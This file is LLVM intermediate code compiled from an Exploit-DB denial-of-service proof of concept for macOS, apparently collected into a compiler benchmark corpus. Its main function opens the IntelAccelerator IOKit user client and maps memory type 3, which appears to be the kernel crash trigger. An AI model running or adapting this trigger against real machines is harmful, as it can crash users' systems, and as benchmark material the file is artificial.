; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_35849.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_35849.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"IntelAccelerator\00", align 1
@.str.1 = private unnamed_addr constant [46 x i8] c"unable to create service matching dictionary\0A\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [12 x i8] c"no matches\0A\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"got service: %x\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@.str.6 = private unnamed_addr constant [31 x i8] c"got userclient connection: %x\0A\00", align 1
@kIOMapAnywhere = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp ne i32 %10, 0
  br i1 %11, label %14, label %12

12:                                               ; preds = %0
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %51

14:                                               ; preds = %0
  %15 = load i32, i32* @kIOMasterPortDefault, align 4
  %16 = load i32, i32* %3, align 4
  %17 = call i64 @IOServiceGetMatchingServices(i32 %15, i32 %16, i32* %4)
  store i64 %17, i64* %2, align 8
  %18 = load i64, i64* %2, align 8
  %19 = load i64, i64* @KERN_SUCCESS, align 8
  %20 = icmp ne i64 %18, %19
  br i1 %20, label %21, label %23

21:                                               ; preds = %14
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %51

23:                                               ; preds = %14
  %24 = load i32, i32* %4, align 4
  %25 = call i64 @IOIteratorNext(i32 %24)
  store i64 %25, i64* %5, align 8
  %26 = load i64, i64* %5, align 8
  %27 = load i64, i64* @IO_OBJECT_NULL, align 8
  %28 = icmp eq i64 %26, %27
  br i1 %28, label %29, label %31

29:                                               ; preds = %23
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %51

31:                                               ; preds = %23
  %32 = load i64, i64* %5, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i64 %32)
  %34 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %34, i32* %6, align 4
  %35 = load i64, i64* %5, align 8
  %36 = call i32 (...) @mach_task_self()
  %37 = call i64 @IOServiceOpen(i64 %35, i32 %36, i32 2, i32* %6)
  store i64 %37, i64* %2, align 8
  %38 = load i64, i64* %2, align 8
  %39 = load i64, i64* @KERN_SUCCESS, align 8
  %40 = icmp ne i64 %38, %39
  br i1 %40, label %41, label %43

41:                                               ; preds = %31
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %51

43:                                               ; preds = %31
  %44 = load i32, i32* %6, align 4
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.6, i64 0, i64 0), i32 %44)
  br label %46

46:                                               ; preds = %43
  store i32 0, i32* %7, align 4
  store i32 4096, i32* %8, align 4
  %47 = load i32, i32* %6, align 4
  %48 = call i32 (...) @mach_task_self()
  %49 = load i32, i32* @kIOMapAnywhere, align 4
  %50 = call i64 @IOConnectMapMemory(i32 %47, i32 3, i32 %48, i32* %7, i32* %8, i32 %49)
  store i64 %50, i64* %2, align 8
  store i32 0, i32* %1, align 4
  br label %51

51:                                               ; preds = %46, %41, %29, %21, %12
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @IOServiceGetMatchingServices(i32, i32, i32*) #1

declare dso_local i64 @IOIteratorNext(i32) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i64 @IOConnectMapMemory(i32, i32, i32, i32*, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
